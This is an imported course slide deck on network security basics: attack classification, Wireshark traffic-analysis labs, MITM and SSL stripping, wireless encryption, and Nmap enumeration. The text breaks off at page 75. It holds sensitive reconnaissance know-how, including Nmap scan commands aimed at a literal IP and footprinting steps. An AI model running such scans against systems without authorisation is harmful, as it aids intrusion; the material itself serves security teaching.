---
title: "Network ACS"
type: acs-course-pdf
course: "ACS Advanced"
source_pdf: "E:\\ProJect\\ACS File\\Network ACS.pdf"
source_size_bytes: 6770336
source_modified: 2025-08-04T21:05:56
imported_at: 2026-06-14T14:14:59
pages: 167
tags:
  - acs
  - imported-pdf
  - cybersecurity
---

# Network ACS

- Source PDF: `E:\ProJect\ACS File\Network ACS.pdf`
- Pages: 167
- Pages with extracted text: 167

> Imported from PDF for Obsidian search and review. Verify formatting against the original PDF when precision matters.

## Page 1

Network Security Basic
ACS Education 3rd

## Page 2

Index
Index
• Network security overview
• Enumeration
• Spoofing
• Flooding

## Page 3

Network
Security
Overview
01
• Overview
• Network protocol security
• Network traffic analysis with
Wireshark
• Wireshark advanced usage
• Man in the middle
• Wireless security

## Page 4

44
Overview
⚫ What the network hacking means
- Refer to hacks that occur on the network
- Done by the breach of confidentiality,integrity,and availability,i.e., the three pillarsof security
⚫ Network threats
- Along different lines of communication, vulnerabilities that threaten the three pillars of
security in different ways exist.
- Breaches can be caused by threats to any of the three pillars of security, other elements, or
combinations of them.
A network hack is an attack that exploits threats associated with a connection on a network.
These attacks can be categorized in terms of the three pillars of security, or they can be
interpreted as other more complex processes of convergence.
Network hacking overview
Internet

## Page 5

55
Overview
⚫ Network threat factor
- Trick network devices into communicating or not communicating maliciously
- Eavesdrop by intervening in the middle of a network communication path
- Disrupt the proper functioning of a service by using network communications from an
external party (DoS)
- Penetrate by exploiting weak access control settings that fail to block or detect abnormal
access
- Steal a view of internal assets, as in scanning (network scanning)
- Force a disconnection of legitimate communications to hijack the session (session hijacking)
The following factors can be considered as threats to network attacks.
Network hacking overview

## Page 6

66
Overview
⚫ Attack type categorization by security element
- Confidentiality
• Sniffing type attacks
▪ Refer to “sniffing,” i.e., eavesdropping, monitoring, etc., in the middle of network traffic
▪ Threat of eavesdropping and viewing data, such as passwords, while it is being
communicated
▪ Attack example
− Password sniffing : an attack that surreptitiously eavesdrops on a network to steal
passwords
The three pillars of security (confidentiality, integrity, and availability) provide a framework for
understanding the different types of network attacks, as described below.
Network hacking overview

## Page 7

77
Overview
⚫ Attack type categorization by security element
- Integrity
• Spoofing type attacks
▪ Refer to "disguise", i.e. tricking a user into doing anomalous things, disguised as
something they want to do
▪ Force normal behavior to change to abnormal behavior by manipulating
communication paths, etc
▪ Attack examples
− DNS spoofing : an attack that manipulates a Domain Name Server (DNS) to redirect a
view of a legitimate URL being directed to a page created by an attacker.
− ARP Spoofing : an attack that uses Address Resolution Protocol (ARP) to fake a Mac
address
The three pillars of security (confidentiality, integrity, and availability) provide a framework for
understanding the different types of network attacks, as described below.
Network hacking overview

## Page 8

88
Overview
⚫ Attack type categorization by security element
- Availability
• DoS type attacks
▪ Short for Denial of Service
▪ Perform a denial of service attack to prevent a server or system from functioning
▪ Attack examples
− SYN flood attack : an attack that uses Synchronize (SYN) packets to overwhelm the
network traffic capacity, making it difficult for legitimate access
− HTTP flood attack : an attack that uses the GET or POST method of the HTTP protocol
to overload the web page access
The three pillars of security (confidentiality, integrity, and availability) provide a framework for
understanding the different types of network attacks, as described below.
Network hacking overview

## Page 9

99
Overview
⚫ Attack type categorization by security element
- Composite or unclassified attacks
• Scanning type attacks
▪ Act of examining the configuration of the target system or network environment
▪ Why this hardly falls under the threat to the three pillars of security.
− Scanning attacks do not seek information that is hidden in secrecy (but rather include
publicly available information such as Whois).
− Malicious intent is difficult to determine.
▪ Attack example
− Port scanning : aim to determine what services a particular target's devices provides
The three pillars of security (confidentiality, integrity, and availability) provide a framework for
understanding the different types of network attacks, as described below.
Network hacking overview

## Page 10

1010
Overview
⚫ Attack type categorization by security element
- Composite or unclassified attacks
• Session hijacking attacks
▪ Hijack a connection between two devices that trust each other and trick them into
connecting to the attacker as one of the users
▪ Why this hardly fits into a threat to just one of the pillars of security.
− Breach of confidentiality, because the attacker needs to know the session connection
information in order to hijack the session connection in the middle
− Breach of integrity, because the attacks involve fooling a session into thinking it's a
connection from a particular user
− They are a combination of confidentiality and integrity violations, which is difficult to
consider as a single-element attack.
The three pillars of security (confidentiality, integrity, and availability) provide a framework for
understanding the different types of network attacks, as described below.
Network hacking overview

## Page 11

1111
Network protocol security
⚫ Attacks can be broadly categorized as passive and active.
- Passive attacks
• No actual malicious behavior performed on the target system
• Primarily aimed at obtaining confidential material through eavesdropping or traffic
analysis (breach of confidentiality)
• Perform stealthily and are difficult to detect
• E.g., sniffing, traffic analysis, port scanning
- Active attacks
• Actual malicious behavior performed on the target system that compromises its integrity,
availability, or confidentiality
• Detectable because the consequences of the attack are obvious
• E.g., spoofing, tempering, session hijacking
The types of network attacks can be viewed from the perspective of the three pillars of security
(confidentiality, integrity, and availability), which are described below.
Classification of network attacks

## Page 12

1212
Network protocol security
⚫ Address Resolution Protocol (ARP)
- The following is the header structure of an ARP packet.
- The ARP protocol is typically used to obtain a MAC address through an IP address.
- Simply manipulating the hardware or a protocol address of the sender would be enough to
make the communication behave differently.
- How to prevent
• Require static MAC address management
The protocols used in networks were designed largely to make data reliable. When they were
first designed, security was not a major consideration, which is why most protocols have security
vulnerabilities.
Security vulnerabilities in network protocols
Hardware type Protocol type
Hardware length Protocol length Operation
Sender hardware address
Sender protocol address
Target hardware address
Target protocol address

## Page 13

1313
Network protocol security
⚫ Internet Control Message Protocol (ICMP)
- The following is the header structure of an ICMP packet.
- ICMP has a different header structure for each type and code.
- A typical ICMP packet is 64 bytes in size.
- Attackers would expand this 64-byte packet to a size of 65000 bytes and send it.
- The system receiving the packet would then be overwhelmed in processing the data.
- How to prevent
• The ICMP protocol itself should not be used or must be blocked.
The protocols used in networks were designed largely to make data reliable. When they were
first designed, security was not a major consideration, which is why most protocols have security
vulnerabilities.
Security vulnerabilities in network protocols
Type Code Checksum
Other message specific information

## Page 14

1414
Network protocol security
⚫ Transmission Control Protocol (TCP)
- The following is the header structure for TCP
- TCP has a complex header structure and many vulnerabilities.
• Manipulation of the sequence and acknowledgment numbers would lead to stealing data
from completely unrelated sessions.
• There are various vulnerabilities, such as manipulating flags to induce different behaviors
and interfering with the TCP communication process.
The protocols used in networks were designed largely to make data reliable. When they were
first designed, security was not a major consideration, which is why most protocols have security
vulnerabilities.
Security vulnerabilities in network protocols
Source port Destination port
Sequence number
Acknowledgment number
Header
length Reserved C E U A P R S F Window size
Checksum Urgent pointer
Options and padding
Data

## Page 15

1515
⚫ Packet capture methods
- The most common methods of packet collection are hub, switching, and TAP.
- Each collection method has its advantages and disadvantages.
- Hub method
• All network traffic is shared and half duplexed.
• Typically 10 Mbps devices are the most common, although some 100Mbps capable devices
are occasionally used.
• Will cause collisions and may increase retransmissions when used.
- Switching method
• Must be supported by network devices.
▪ E.g., older Cisco may support 2 with TX (transmitting) and RX (receiving) together.
• Vendor-specific commands vary (commonly referred to as mirroring or SPAN).
• Full duplex support is available and may result in traffic overflow.
Network traffic analysis with Wireshark
Packet capture techniques

## Page 16

1616
⚫ Packet capture methods
- Test Access Port (TAP) method
• Physically insert a TAP device in the middle of the line
• Cause network downtime during installation
• Divided into network TAP, aggregation TAP (aggregator), regeneration TAP, etc.
• Important to select media type (e.g., fiber-optic, copper)
• There are now devices that support multiple functions such as aggregator, regeneration,
and filter in a single device.
• Devices that can support Secure Sockets Layer (SSL) decryption are also available.
Network traffic analysis with Wireshark
Packet capture techniques

## Page 17

1717
⚫ Understanding network TAPs
- Network TAP (one-to-one)
- Regeneration TAP
Network traffic analysis with Wireshark
Packet capture techniques

## Page 18

1818
⚫ Understanding network TAPs
- Matrix switches
- Aggregation TAP (port, link)
Network traffic analysis with Wireshark
Packet capture techniques

## Page 19

1919
⚫ Customize a capture interface
Network traffic analysis with Wireshark
Wireshark capture
Packet capture method (interfaces)
1. Setting preferences from the Capture menu
2. Setting icons via the main toolbar
3. Setting preferences via Interface List
※ Load packet files into memory (which stops
after collecting a certain amount has been
captured) unless you select the “Save
separately” option.
※ Select the target interface to collect from
※ If the packet is in transit, ‘Traffic’ will show
it.

## Page 20

2020
⚫ Save options
Network traffic analysis with Wireshark
Wireshark capture
Captrue -> Options…
1. Disable if winpcap is not
installed
2. Color scheme in capture filter
(different from display filter) -
green (normal), red (abnormal)
3. Output
Select the path in File -> Browse...
and necessarily select the Output
format : .pcap or .pcapng.
Select “Create a new file
automatically…”
(split into multiple packets, 50M
suitable, server 100M)
Each option can be used in
combination.
4. Options
Update list of packets in real-time
Automatically scroll during live
capture
Automatic name conversion for MAC,
network, port, etc.
“Stop capture automatically after…”
option available

## Page 21

2121
⚫ Basic interface
Network traffic analysis with Wireshark
Wireshark interface
1 2
3
4
5 6
Main toolbar
Filter toolbar
Packet list
Packet details Packet bytes
7
Status bar

## Page 22

2222
⚫ Global settings (menu where you can set basic screen settings and filtering)
Network traffic analysis with Wireshark
Setting up Wireshark
Global settings allow you to create profiles for each user and tasks they perform, which can
be used for each purpose in analysis. E.g., wireless, forensic, DDoS profiles

## Page 23

2323
⚫ Coloring technique
- The coloring helps to visually distinguish between protocols and mark anomalous packets.
Network traffic analysis with Wireshark
Setting up Wireshark
Top-down prioritization of rules when they overlap

## Page 24

2424
⚫ Commonly used menu items in analysis
Network traffic analysis with Wireshark
Wireshark main menu
Follow and Statistics
options are frequently
used in analysis
“Follow” in the drop-down list under “Analyze,” and “Statistics” in the main
toolbar are frequently used in analysis.

## Page 25

2525
⚫ How to filter (1/3)
Network traffic analysis with Wireshark
Wireshark filtering technique
After you master basic filtering, learn the “Filter Expressions” to practice typing directly in
the Filter toolbar.
Autocomplete with the (.) function when typing directly in the Filtering toolbar.
E.g., tcp. or tcp.flags.

## Page 26

2626
⚫ How to filter (2/3)
Network traffic analysis with Wireshark
Wireshark filtering technique
If you have a desired filtering field, select
the desired field in the “Decode as…”
dialog box and
right click it.
Apply as Filter : apply on click
Prepare a Filter: enter in the filter entry
bar and run when applied.
Mainly used to combine several filters
Use with combinations of and, or, not

## Page 27

2727
⚫ How to filter (3/3)
⚫ Wireshark default filtering
- Search for specific protocols [tcp, udp, ip, http, arp, icmp, dns, bootp] : with [bootp] for DHCP
discovery
- Search for IP addresses [ip.addr == 192.168.0.1, ip.src, ip.dst] : use src, dst for specific source
and destination
- Operators [and, or, not] [&&, ||, !] : available as alphabetic characters and symbols
- For IP, subnet [ip.addr == 192.168.0.0/24] option is available.
- Can use >= and <= symbols
- For default filters, you can edit by modifying cfilters in the Wireshark installation path.
- Always check with the colors in the Filter toolbar when filtering
(green - normal, red - abnormal, yellow - may or may not apply)
- To analyze well, filter, filter, filter (only the data you want should be extractable).
Network traffic analysis with Wireshark
Wireshark filtering technique

## Page 28

2828
⚫ How to analyze ARP Poison
⚫ For ARP, automatically raise Duplicate IP Address event if a duplicate occurs during capture
⚫ Most attackers will spoof the gateway, so if you see a duplicate MAC with a different gateway,
check and take action.
Network traffic analysis with Wireshark
Attack-specific analysis techniques

## Page 29

2929
⚫ Lab exercise 1 for analyzing Wireshark malicious traffic
⚫ Open and analyze an ARP packet file
- What is the ARP type for ARP spoofing?
- What is the real MAC address of the attacker?
- How many packets has the attacker sent?
Network traffic analysis with Wireshark
Attack-specific analysis techniques

## Page 30

3030
⚫ FTP brute force
⚫ Many login failures appear, and you can check them using FTP response code.
⚫ You need to check the packet structure of each application to see if there is a response code.
- Check the RFC and look at the response code for your favorite applications, and look at the
ORA code for Oracle.
Network traffic analysis with Wireshark
Attack-specific analysis techniques

## Page 31

3131
⚫ Lab exercise 2 for analyzing Wireshark malicious traffic
⚫ Open and analyze the FTP packet file
- What is the FTP login success message?
- How many times has the attacker failed?
- Extract the username used to connect as CSV
Network traffic analysis with Wireshark
Attack-specific analysis techniques

## Page 32

3232
⚫ See how easily you can identify dramatic changes in traffic using I/O Graphs (DDoS and flood
attacks).
⚫ Pay attention to the unit on the y-axis (default unit : Packets/1 sec)
⚫ You may want to memorize commonly used TCP flags and User Datagram Protocols (UDPs).
⚫ Click on the graph portion to move packets.
Wireshark advanced usage
Attack-specific analysis techniques
What is the difference between tcp.flags
== 0x0002 and tcp.flags.syn?

## Page 33

3333
⚫ Analyze using Conversations (when there are many repeating IPs and multiple ports)
⚫ Compare ports and data volumes to see that the same pattern does not occur on a typical
network.
⚫ Sending large amounts of data from one direction and getting no response is also suspicious!
Wireshark advanced usage
Attack-specific analysis techniques
The same pattern keeps
repeating.

## Page 34

3434
⚫ Analyze using Endpoints (if each IP is coming in randomly)
⚫ Sort columns and identify data repetitions.
⚫ Use Find Frame as a function to move packets immediately.
⚫ Identify the process of a session by filtering if necessary.
Wireshark advanced usage
Attack-specific analysis techniques
Check with
column sorting

## Page 35

3535
⚫ Utilize long term traffic analysis methods (I/O Graphs and File(s) in Set)
⚫ Clicking “List File(s)” in File Set automatically changes the I/O Graphs. Click to view and select
graphs for focused analysis in the file list.
⚫ Multiple IO Graphs, Conversations, Endpoints can be viewed using File(s) in Set.
⚫ Must define filtering elements to be used in advance (easier to analyze on systems with many
RAID caches)
Wireshark advanced usage
Attack-specific analysis techniques

## Page 36

3636
⚫ Lab exercise for analyzing Wireshark malicious traffic
⚫ Open and analyze the SYN packet file
- What types of flags are there?
- Analyze attack patterns as you eliminate attacks one by one.
Wireshark advanced usage
Attack-specific analysis techniques

## Page 37

3737
⚫ Use the web traffic analysis method in the menu (Statistics -> HTTP)
⚫ Type http contains "[search term]" for scanning and filtering to see what requests are there.
⚫ To see EXE files, search with http contains "in DOS mode" for filtering
⚫ To see full EXE files, use frame contains "\x4D\x5A\x90\x00"
⚫ To extract files, use “Export Objects -> HTTP” in the File drop down list from the menu bar.
Wireshark advanced usage
Attack-specific analysis techniques

## Page 38

3838
⚫ Use the web traffic analysis method in the menu (Statistics -> HTTP)
⚫ Web attacks using hacking tools result in a variety of errors, including HEAD requests that
would not occur with normal requests.
- Common methods used on the Web are GET and POST, and any other requests require
analysis.
Wireshark advanced usage
Attack-specific analysis techniques

## Page 39

3939
⚫ Use the web traffic analysis method in the menu (Statistics -> HTTP)
⚫ Web attacks using hacking tools result in a variety of errors, including HEAD requests that
would not occur with normal requests.
- What attacks would you suspect if you saw a large number of 4XX errors?
- What attacks would you suspect if you saw a large number of 5XX errors?
Wireshark advanced usage
Attack-specific analysis techniques

## Page 40

4040
⚫ Use the web traffic analysis method in the menu (Statistics -> HTTP)
⚫ Note that this is a persistent web attack and web vulnerability scanner pattern, not a typical
web request.
⚫ There are constant requests for EXE and DLL, and dir c:\
⚫ Load distribution is easier to detect if a particular IP is sending a lot of requests.
Wireshark advanced usage
Attack-specific analysis techniques

## Page 41

4141
⚫ Extract EXE files (application/octet-stream)
⚫ Select TCP in the “Conversation Filter” after making your selection.
⚫ Select EXE files as the “Export Objects”.
⚫ Click the “Save As” button and proceed with the analysis.
Wireshark advanced usage
Attack-specific analysis techniques

## Page 42

4242
⚫ Combine PDUs in the ”Follow TCP Stream” dialog box for identifiable content.
⚫ The client-side and the server-side are differently color-coded for distinction.
⚫ For web traffic, see response codes.
⚫ Automated tools can use many vulnerability codes at once, making analysis easier.
Wireshark advanced usage
Attack-specific analysis techniques

## Page 43

4343
⚫ How to analyze Wireshark web traffic
- First identify the attacker's IP from 4XX / 5XX errors.
- Check the HTTP methods -> Methods other than GET and POST are usually not found.
- Check User-Agent information -> For tools, the tool name is usually identifiable under the
agent name.
- Check URI Query information -> identifiable if you understand basic web vulnerabilities
- Check Referer information -> Check the old links and see which site they came from.
⚫ If you are using web server logs, you can analyze based on them to get a complete set of
data.
Wireshark advanced usage
Detailed analysis techniques

## Page 44

4444
⚫ Things to consider during analysis (quick analysis tips)
- Use existing security devices
• Synchronize the time of all your devices using the Network Time Protocols (NTPs) and
Precision Time Protocols (PTPs)
• Use log alerts to extract packets from logs
- Use graphs and statistics
• Easy ways to detect changes in traffic
• However, malware and command execution are not easy to analyze from them.
- Use Snort, Suricata IDS/IPSes
• Identify malware by sending packet files
• However, EXE files are convenient and easy to analyze after extraction.
- Analyze DNS query values (many malware prefer DDNS to actual hard IP coding)
- Train yourself on filtering rules and steps to analyze in advance
Wireshark advanced usage
Detailed analysis techniques

## Page 45

4545
Man in the middle
⚫ MITM
- Short for Man In The Middle attack, a technique used to eavesdrop on or manipulate
communications.
- It involves inserting oneself between two communicating systems, making them think they
are connected to each other.
- In reality, they are connected to an intermediary, who eavesdrops on and manipulates the
information being sent to them and then forwards it to the other side.
A man-in-the-middle attack is an attack technique that tampers with network communications
to eavesdrop on or manipulate the content of the communication. By fabricating and altering
data, a third party can deceive two systems into exchanging false information.
MITM Overview
We're
connected!
We're
connected!
We're
connected!
In fact, I'm
peeking!

## Page 46

4646
Man in the middle
⚫ MITM types
- Sniffing
• Capture data packets and examine their contents
- Packet injection
• Inject malicious data along with normal data
- Session hijacking
• Intercept an active connection between two systems
- SSL stripping
• Block SSL/TLS connections, switching them from secure HTTPS to insecure HTTP
A man-in-the-middle attack is an attack technique that tampers with network communications
to eavesdrop on or manipulate the content of the communication. By fabricating and altering
data, a third party can deceive two systems into exchanging false information.
MITM Overview

## Page 47

4747
Man in the middle
⚫ How SSL MITM attacks work
- The attacker waits for the HTTPS request with a spoofing operation in the middle.
- When an HTTPS request is made, the attacker’s spoofed authentication is passed to the client.
- Victim and attacker communicate using the attacker’s authentication.
- Attacker and server communicate using the real server’s authentication
SSL MITM is when an attacker intervenes before an SSL connection is established between a
client and a server and uses the attacker's fake certificate to eavesdrop on SSL communication
between the client and the server.
Understanding SSL MITM attacks
Communication
using the attacker’s authentication
Forwarding requests
using the server’s authentication

## Page 48

4848
Man in the middle
⚫ How SSL stripping attacks work
- Attacker waits for victim to connect after ARP spoofing attack
- Set a firewall policy to forward anything coming in on port 80 to a random port
- Prevent the attacker from using SSL strip techniques to communicate over SSL
- Victim connects to the server using HTTP instead of HTTPS.
- The attacker captures packets to extract ID, P/W.
SSL strip is a technology that was created to bypass the requirement for certificate verification in
traditional SSL MITM attacks, which can lead to discovery of hacking attempts.
Understanding SSL Strip Attacks
HTTP communication HTTPS communication

## Page 49

4949
Man in the middle
⚫ Public Key Infrastructure (PKI)
- The primary defense mechanism of a PKI is mutual authentication.
- The user’s device also evaluates the application while the application evaluates and
authenticates the user.
- Use a Virtual Private Network (VPN)
• Using key-based encryption, attackers on an adjacent shared network can't penetrate the
user's system.
- Use HTTPS only
• Enforce rules to prevent HTTP addresses from ever being used
⚫ Use multi-factor authentication
Methods to defend against man-in-the-middle attacks include public key based infrastructure
(PKI, Public Key Infrastructure), strong mutual authentication, and latency examination.
How to prevent MITM

## Page 50

5050
Wireless security
⚫ Incident case 1 (South Korea)
- On May 11, 2008, an attempt was made to break into the computer system of a bank.
- The primary goal was to infiltrate internal networks based on financial information
distributed over wireless LAN networks.
- A group equipped with directional antennas and wireless LAN cards attempted to gain
access to a commercial bank's wireless LAN network.
1. At 00:50, the group arrived at the entrance to the parking lot of the bank's hub center and
attempted to hack using the antenna and laptop inside the car.
2. The wireless router in the customer service center on the 6th floor detected the criminals'
access attempt.
3. At 01:40, 12 hacking attempts were made, obtaining the router's operating ID and IP address.
4. At 01:45, the group was caught by police trying to hack the bank using the same trick.
A domestic case of wireless hacking occurred in South Korea in 2008 when an attempt was made
to access a bank AP.
Wireless vulnerability threats

## Page 51

5151
Wireless security
⚫ Incident case 2 (United States)
- The computer system of the TJX Companies, Inc. was hacked in the United States.
- The information of 457,000 cardholders was compromised.
- A telescope-shaped antenna was used to access a wireless link.
- This wireless link used WEP for encryption.
- The criminals allegedly aimed a telescope-shaped antenna at TJX-affiliated clothing stores,
sniffing and decoding data streams between handheld pin pads and cash registers.
Credit card information was stolen from a retail conglomerate called TJX in a computer hack in
the United States.
Privacy leaks

## Page 52

5252
Wireless security
⚫ Vistumbler detects nearby APs and scans them.
You can use Vistumbler to gather information from neighboring APs.
Scanning for nearby APs

## Page 53

5353
Wireless security
⚫ Vistumbler detects nearby APs and scans them.
You can use Vistumbler to gather information from neighboring APs.
Scanning for nearby APs

## Page 54

5454
Wireless security
⚫ WLAN security standards definition
- User authentication to control the access of authorized internal users, and standards for the
encryption of data over the air.
Wireless LAN security technologies include WEP, WPA, and WPA2.
Wireless LAN Security Technologies
Division WEP
(Wired Equivalent Privacy)
WPA
(Wi-Fi Protected Access)
WPA2
(Wi-Fi Protected Access 2)
Overview - Established in 1997
(deleted 2003)
- Complementary to WEP
(Wi-Fi Alliance)
-Compliant with IEEE 802.11i
(2004)
Authentication- Use a pre-shared secret key
(64-bit, 128-bit)
- EAP authentication protocol
(802.1x) using a separate server
- WPA-PSK (pre-sharedsecret key)
- EAP authentication protocol
(802.1x) using a separate certifier
-WPA-PSK ( p r e-s h a r eds e c r e t  k e y )
Encryption
- Use a fixed secret key (same
as the authentication key)
- Use the RC4 algorithm
- Dynamic password changes
(TKIP)
- Use the RC4 algorithm
-Dynamic password changes
(CCMP)
- Strong block ciphers like AES
algorithms
Security
- 64-bit WEP keys are exposed
within minutes
- Vulnerable and not widely used
-Uses the RC4 algorithm, which is
more secure than WEP but
imperfect
- Provide robust security
features

## Page 55

5555
Wireless security
⚫ Why is WEP vulnerable?
WEP is part of the IEEE 802.11 protocol that defines wireless LAN standards and is used to
provide security between wireless LAN operations. It is currently cracked and is not used to
transmit sensitive information.
WEP
WEP Key Store
(k1, k2, k3, k4)
WEP Key
 IV
RC4 Key Stream
Ciphertext
IV
 PAD
 KID
RC4
Cipher
X
Data
 ICV
CRC-32
Checksum
WEP Seed XOR Algorithm
WEP-encrypted Packet (MAC Frame)

## Page 56

5656
Wireless security
⚫ Open System[Null Authentication]
⚫ Shared key[WEP] ---------------- 64bits[40bits + 24IV]
128bits[104bits + 24IV]
⚫ [RADIUS]-EAP + (WEP/WPA) WPA[TKIP] - P.S.K mode
- Enterprise mode
⚫ Pre-shared key[WPA] ---- WPA2[CCMP-AES] - P.S.K mode
- Enterprise mode
WLAN authentication methods include Open System, shared key, authentication server, and pre-
shared key.
WLAN authentication methods

## Page 57

5757
Wireless security
⚫ Wired Equivalency Privacy (WEP)
- WEP, the primary encryption method for wireless LANs, protects transmitted MAC frames
with the RC4 stream encryption method using a combination of a 40-bit long WEP shared
secret key and a randomly selected Initialization Vector (IV) for a total of 64 bits.
⚫ Temporal Key Integrity Protocol (TKIP)
- It uses the same RC4 stream cipher as WEP but enhances security by using a different key
for each frame and automatically renewing the temporary secret key as needed.
⚫ Counter with CBC-MACP (CCMP)
- The strongest cipher that uses a block cypher. It is being applied to newer wireless LAN
devices. In WPA, this is called the WPA2 method.
⚫ PSK mode manually sets the encryption key on the AP (no separate authentication server).
⚫ Enterprise mode automatically distributes encryption keys from the authentication server
(centralized key management).
Encryption methods include WEP, TKIP, CCMP, and PSK.
WLAN Encryption Methods

## Page 58

Enumeration
02
• Overview
• An overview of Nmap
• Host discovery and port scanning
• DNS enumeration
• Service enumeration
• Saving scan results

## Page 59

5959
⚫ Network scanning
- Determine the techniques used in the actual attack method or obtain network structure,
service information, etc.
- Use the original or modified form of an existing network protocol
• Ex) half-open scan, Xmas scan, etc.
- Scanning methods
• Scanning with tools
▪ The current textbook uses Nmap as a reference
▪ In addition to Nmap, there are hping3 and others.
• Scanning with services
▪ Whois
▪ DNS
▪ Archive.org
Overview

## Page 60

6060
An overview of Nmap
⚫ Definition
- Scanning means finding out what services, ports, host information, etc. are being offered
over the network.
- Request and response mechanisms for TCP-based protocols
- Nmap is one of the most representative scanning tools.
⚫ Purpose
- Check for open ports
- See what services are being offered
- Version of the running daemon
- Operating system type and version
- Vulnerabilities
⚫ Protocols used for scanning : ICMP, TCP, UDP
Scanning allows you to check whether the servers providing the service are up and running and
what services they are providing. The scanning protocols can be categorized as ICMP, TCP, and
UDP.
Network Overview

## Page 61

6161
An overview of Nmap
⚫ Nmap options
Nmap is one of the most representative scanning tools for scanning. Each option offers different
benefits to the user, and the quality of the information you get depends on how you use them.
Also, each option is case-sensitive.
Network Scanning Lab
-sT : open scan with connect() function
-sS : SYN scan that does not establish a session
-sF : scan with FIN packets
-sN : scan with null packets
-sX : scan with Xmas packets
-sP : check if the host is up with ping
-sU : scan UDP ports
-sR : scan RPC ports
-sA : analyze TTL values for ACK packets
-sW : analyze window size for ACK packets
-b : scan FTP bounce
-f : fragment packets to pass through the firewall when
scanning
-v : show scan details
-P0 : do not ping before scanning
-PT : use TCP packets instead of ping
-PS : send only TCP SYN packets to check for system
activation
-PI : use ICMP to check for system activation
-PB : use both TCP and ICMP to check for host activation
-O : estimate the operating system
-I : use the Ident protocol (RFC1413) to check which user an
open process belongs to
-n : do not perform DNS lookup
-R : perform DNS lookup
-PR : ARP ping
--traceroute: trace the route to the host
-PE : scan using ICMP echo
-PU : ping using UDP
-PS : TCP SYN ping
-sL : list scan
-sn : do not scap ports

## Page 62

6262
An overview of Nmap
⚫ Nmap usage
- Search for active hosts
• Option : -sP
• E.g., nmap -sP 192.168.0.0/24
When using the -sP option with Nmap, you can see which systems are active in the bandwidth
you are searching for.
Network Scanning Lab

## Page 63

6363
An overview of Nmap
⚫ Nmap usage
- Operating system detection
• Option : -O
• E.g., nmap -O 211.171.14.207
⚫ For a machine, the device type
is marked as embedded.
Nmap can be used with the -O option to obtain Operating System (OS) information.
Network Scanning Lab

## Page 64

6464
An overview of Nmap
⚫ Nmap usage
- Scan the top N most used ports
• Option : --top-ports N (number of ports)
• E.g., nmap --top-ports 5 211.171.14.207
Nmap provides the --top-ports N option (where N stands for ‘number’) to scan the top N ports for
high usage.
Network Scanning Lab

## Page 65

6565
An overview of Nmap
⚫ Nmap usage
- Scan with Scripts
• Option : --script
• Ex) nmap -p 139, 445 --script=smb-check-vulns 192.168.150.24
Use the smb-check-vulns script to check for MS08-067 vulnerability and whether or not the
Conficker worm is infected.
When you use the --script option in Nmap, you can utilize scripts provided by Nmap for scanning.
These scripts are located in the scripts folder where Nmap is installed.
Network Scanning Lab

## Page 66

6666
An overview of Nmap
⚫ Scan type → ping & ICMP Scan
- ping & ICMP scan
• When sending a ping to Linux
If you scan with ping, you can see that Linux has a TTL value of 64 and Windows has a TTL value
of 128.
Network Scanning Lab
• When sending a ping to Windows

## Page 67

6767
An overview of Nmap
⚫ Using TTL values to estimate the operating system
- Each operating system has its own TTL value.
Each operating system has its own TTL value. You can estimate the operating system by
checking the TTL value that comes back when you ping it.
Network Scanning Lab
OS/Device Version Protocol TTL
AIX 3.2, 4.1 ICMP 255
FreeBSD 5 ICMP 64
HP-UX 11 ICMP 255
HP-UX 11 TCP 64
IRIX 6.x TCP and UDP 60
IRIX 6.5.3, 6.5.8 ICMP 255
Juniper ICMP 64
Linux 2.4 kernel ICMP 255
Linux Red Hat 9 ICMP and TCP 64
SunOS 4.1.3/4.1.4 TCP and UDP 60
SunOS 5.7 ICMP and TCP 255
Windows Server 2003 128
Windows Β ICMP/TCP/UDP 128

## Page 68

6868
Host discovery and port scanning
⚫ Procedure
Footprinting is the process of examining the information on a particular site based on publicly
available information before delving into the details of the system. Footprinting can be broken
down into the following steps, each of which we'll discuss below.
Network scanning
a. Company information
- Location, network address,
etc.
 b. Employee information
- Contacts, emails, etc.
 C. Partner information
- Business association
    information and more
Determine the scope of
the activity
a. Network bandwidth that
provides services
  - Web server
  - DB server
 b. Internalnetworkbandwidth
  - Internally used IP
bandwidth
- Intranet address
Collect a list of
networks
a. Information collection
    through DNS query
- Administrator information
- When to update records
  - DNS information
 b. DNS reverse lookup
- Whether to redirect the
    server
DNS queries
a. Route tracing
- Whether to have
   security device
 b. Reachable networks
Network
reconnaissance

## Page 69

6969
Host discovery and port scanning
⚫ Determine the scope of the activity
- Procedure
- Information you can obtain from searching for public sources
• Locations and related companies and departments, news about acquisitions or mergers,
etc.
• Contact names and phone numbers, email addresses, etc.
• Privacy and security policies, etc.
• Links to other web servers that are relevant to your goals
First, decide how far you are willing to go in terms of information gathering about your attack
target.
Network scanning
Determine the scope of
the activity
Collect a list of
networks DNS queries Network
reconnaissance

## Page 70

7070
Host discovery and port scanning
⚫ Explore and catalog the access paths to the target.
Explore and catalog the access paths to the target.
Network scanning
Determine the scope of
your activity
Collect a list of
networks DNS queries Network
reconnaissance

## Page 71

7171
DNS enumeration
⚫ DNS queries - Whois service
- Procedure
⚫ Accessible information
- Registrants and domain names
- Admin contacts
- Period when records were created and updated
- Primary and secondary DNS servers
• ipvoid.com
• whois.domaintools.com
• iplists.firehol.org
Perform DNS queries and DNS reverse lookups (a method of obtaining DNS names through IP
addresses) to obtain information about the target of your attack target.
Network scanning
whois.co.kr
DNS queriesDetermine the scope of
your activity
Collect a list of
networks
Network
reconnaissance

## Page 72

7272
DNS enumeration
⚫ DNS queries - archive.org
- Procedure
- archive.org
• Snapshot over time
• View past page information
Perform DNS queries and DNS reverse lookups (a method of obtaining DNS names through IP
addresses) to obtain information about the target of your attack target.
Network scanning
DNS queriesDetermine the scope of
your activity
Collect a list of
networks
Network
reconnaissance

## Page 73

7373
DNS enumeration
⚫ DNS queries - Maltego relational search
- Procedure
- Cross-searchable for each item
• People
• Groups of people (Social Network Services)
• Companies
• Organizations
• Web sites
• Internet infrastructures
• Phrases
• Affiliations (org/unit)
• Documents and files
- * http:/www.paterva.com
Perform DNS queries and DNS reverse lookups (a method of obtaining DNS names through IP
addresses) to obtain information about the target of your attack target.
Network scanning
DNS queriesDetermine the scope of
your activity
Collect a list of
networks
Network
reconnaissance

## Page 74

7474
Service enumeration
⚫ Network reconnaissance - tracert, traceroute
- Procedure
- Route tracing
• tracert (Windows)
• traceroute (Unix/Linux)
By monitoring the target's network, you can check for things like the presence of firewalls.
Network scanning
DNS queriesDetermine the scope of
your activity
Collect a list of
networks
Network
reconnaissance

## Page 75

7575
Service enumeration
⚫ Network reconnaissance - VisualRoute
- Procedure
- Route tracing
• VisualRoute
▪ Faster than traceroute and tracert
▪ Easier to understand than
